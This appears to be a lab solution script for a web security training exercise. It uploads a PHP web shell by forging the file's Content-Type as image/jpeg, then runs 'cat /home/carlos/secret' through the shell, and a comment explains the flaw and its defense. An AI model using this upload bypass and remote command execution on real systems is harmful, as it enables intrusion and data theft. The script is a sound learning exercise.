# Lab: Web shell upload via Content-Type restriction bypass

import requests
from pathlib import Path

cwd = Path(__file__).resolve().parent
webshell = cwd / "web_shell.php"

base = "https://0a3b007b041e96d280a98ab900ca00b5.web-security-academy.net"
user_session=requests.Session()

print("===========[step1] login with provided Credential===============")
r = user_session.get(f"{base}/login")   # this lab's login form may also carry a csrf token
login_data = {"username": "wiener", "password": "peter"}
if 'name="csrf"' in r.text:
    login_data["csrf"] = r.text.split('name="csrf" value="')[1].split('"')[0]
r = user_session.post(f"{base}/login", data=login_data)
print("login csrf:", login_data["csrf"])
print("status:", r.status_code)
print("body:", r.text)
'''
                        <form class=login-form id=avatar-upload-form action="/my-account/avatar" method=POST enctype="multipart/form-data">
                            <p>
                            <img src="/resources/images/avatarDefault.svg" class=avatar>
                            </p>
                            <label>Avatar:</label>
                            <input type=file name=avatar>
                            <input type=hidden name=user value=wiener />
                            <input required type="hidden" name="csrf" value="zvBF2WVpUynZDklmyeybkKAmPIPUyBLO">
                            <button class=button type=submit>Upload</button>
                        </form>
'''
user_info={}
if 'name="csrf"' in r.text:
    user_info["csrf"]=r.text.split('name="csrf" value="')[1].split('"')[0]

print("===========[step2] Upload Web Shell===============")
files = {
    "avatar": ("web_shell.php", open(webshell, "rb"), "application/x-php")
}
# form name ↑  ↑ filename to send server  ↑ file content(binary)  ↑ Content-Type
data = {"user": "wiener", "csrf": user_info["csrf"]}

r = user_session.post(f"{base}/my-account/avatar", files=files, data=data)
print("status:", r.status_code)
print("body:", r.text)

'''
status: 403
body: Sorry, file type application/x-php is not allowed
        Only image/jpeg and image/png are allowed
Sorry, there was an error uploading your file.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>
'''

print("===========[step2-1] Upload Web Shell===============")
# [Why this bypass works]
# The 3rd value of the files= tuple becomes a per-part header inside the multipart request:
#
#   Content-Disposition: form-data; name="avatar"; filename="web_shell.php"
#   Content-Type: image/jpeg      <- here
#
# This value is just the client (browser) self-reporting "this is a jpeg".
# The server trusted only this label and checked neither the file content nor the extension.
# So the content is still PHP, but changing the label alone was enough to pass the check.
#
# Defense: never trust client-supplied values. Validate on the server side
#   (extension whitelist + content/magic-byte check) and disable script execution in the upload dir.
files = {
    "avatar": ("web_shell.php", open(webshell, "rb"), "image/jpeg")
}
# form name ↑  ↑ filename to send server  ↑ file content(binary)  ↑ Content-Type
data = {"user": "wiener", "csrf": user_info["csrf"]}

r = user_session.post(f"{base}/my-account/avatar", files=files, data=data)
print("status:", r.status_code)
print("body:", r.text)

'''
status: 200
body: The file avatars/web_shell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">� Back to My Account</a></p>
'''

print("===========[step3] Aceess to my-account again===============")
r = user_session.get(f"{base}/my-account", params={"id": data["user"]}, allow_redirects=False)
print("status:", r.status_code)
print("body:", r.text)
'''
                        <form class=login-form id=avatar-upload-form action="/my-account/avatar" method=POST enctype="multipart/form-data">
                            <p>
                            <img src="/files/avatars/web_shell.php" class=avatar>
                            </p>
                            <label>Avatar:</label>
                            <input type=file name=avatar>
                            <input type=hidden name=user value=wiener />
                            <input required type="hidden" name="csrf" value="DQ5wFIlpm5GeFaT8zWQicQwaNo9gjQxW">
                            <button class=button type=submit>Upload</button>
                        </form>
'''

print("===========[step4] Execute Web Shell===============")
shell_url = f"{base}/files/avatars/web_shell.php"

r = user_session.get(shell_url, params={"cmd": "cat /home/carlos/secret"})

secret = r.text.strip()
print("secret:", secret)